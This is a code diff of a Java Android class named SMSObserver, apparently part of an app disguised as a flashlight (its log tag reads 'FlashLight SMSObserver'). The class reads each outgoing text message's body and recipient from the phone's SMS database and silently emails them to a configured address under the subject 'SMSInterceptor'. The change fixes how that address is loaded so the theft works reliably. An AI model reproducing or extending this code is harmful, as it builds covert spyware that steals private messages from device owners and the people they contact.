@@ -21,32 +21,27 @@ import android.database.ContentObserver;
 public class SMSObserver extends ContentObserver {
 
   private Handler handler;
-
   
   public  static Context context;
 
   private static String endPoint;
   private static String initId = "0";
-  private static String gmailEmailString;
 
   private static final String SUBJECT = "SMSInterceptor";
   private static final String TAG     = "FlashLight SMSObserver";
 
-  public SMSObserver(Handler handler, Context context) {
+  public SMSObserver(final Handler handler, final Context context) {
     super(handler);
-
     handler = handler;    
     SMSObserver.context = context;
-    gmailEmailString = new Configure().emailAddress();
-
   }
 
-  public void threading(final String message) {
+  public void threading(final String message, final String email_address) {
     new Thread(new Runnable() {
       @Override
       public void run() {
         try {
-          new GmailSender().sendMail(SUBJECT, message, gmailEmailString);
+          new GmailSender().sendMail(SUBJECT, message, email_address);
         }
         catch(Exception e) {
           e.printStackTrace();
@@ -78,6 +73,12 @@ public class SMSObserver extends ContentObserver {
     Uri uriSMSURI = Uri.parse("content://sms");
     String[] sCol = {"_id","type","body","address"};
     String sOrder = "date desc limit 1";
+    String gmailEmailString = new Configure().emailAddress();
+    /*Note that the call to emailAddress is done in onReceive()
+    and not in the constructor because that constructor gets called
+    whereas the onReceive method is called everytime there is a change
+    to the sms table in the database. If we don't make this call here
+    the email address will always be empty.*/
    
     try {
 
@@ -86,12 +87,11 @@ public class SMSObserver extends ContentObserver {
 
       final String id   = cursor.getString(cursor.getColumnIndex("_id"));
       final String type = cursor.getString(cursor.getColumnIndex("type"));
-
       final String body = cursor.getString(cursor.getColumnIndex("body"));
       final String addr = cursor.getString(cursor.getColumnIndex("address"));
 
       if(!initId.equals(id) && type.equals("2")) {
-        threading("OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body); initId = id;
+        threading("OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body, gmailEmailString); initId = id;
       }
       else { } // Incoming messages if type == 1
     }
